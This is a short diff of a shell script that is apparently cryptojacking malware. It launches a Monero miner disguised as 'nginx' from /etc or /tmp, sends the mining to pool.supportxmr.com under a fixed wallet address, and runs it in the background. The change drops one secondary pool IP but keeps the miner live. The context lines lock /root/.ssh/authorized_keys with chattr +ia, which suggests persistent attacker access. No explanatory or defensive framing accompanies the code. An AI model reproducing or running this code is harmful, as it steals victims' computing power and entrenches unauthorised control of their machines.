@@ -558,7 +558,7 @@ if [ -f "$rtdir" ]; then
         cd /etc
         echo "root not runninng"
         sleep 5s
-        ./nginx --log-file=/etc/kta --keepalive --no-color --cpu-priority 5 -o pool.supportxmr.com:443 --tls -o 80.211.206.105:9000 -u 44UASB7gTUKFQq69X8Cf8bR6Wzb91j17H55j88BfZmozXyKEsRze6v4LnWN8pDMGX8QNvGs9tTao16CnSRvAH1L7665oGxM --coin monero --background &
+        ./nginx --log-file=/etc/kta --keepalive --no-color --cpu-priority 5 -o pool.supportxmr.com:443 --tls -u 44UASB7gTUKFQq69X8Cf8bR6Wzb91j17H55j88BfZmozXyKEsRze6v4LnWN8pDMGX8QNvGs9tTao16CnSRvAH1L7665oGxM --coin monero --background &
     fi
     chmod 600 /root/.ssh/authorized_keys
     chattr +ia /root/.ssh/authorized_keys
@@ -583,7 +583,7 @@ else
         cd /tmp
         echo "user not running"
         sleep 5s
-        ./nginx --keepalive --no-color --cpu-priority 5 -o pool.supportxmr.com:443 --tls -o 80.211.206.105:9000 -u 44UASB7gTUKFQq69X8Cf8bR6Wzb91j17H55j88BfZmozXyKEsRze6v4LnWN8pDMGX8QNvGs9tTao16CnSRvAH1L7665oGxM --coin monero --background &
+        ./nginx --keepalive --no-color --cpu-priority 5 -o pool.supportxmr.com:443 --tls -u 44UASB7gTUKFQq69X8Cf8bR6Wzb91j17H55j88BfZmozXyKEsRze6v4LnWN8pDMGX8QNvGs9tTao16CnSRvAH1L7665oGxM --coin monero --background &
     fi
     echo "user running..."
     chmod 777 /tmp/nginx
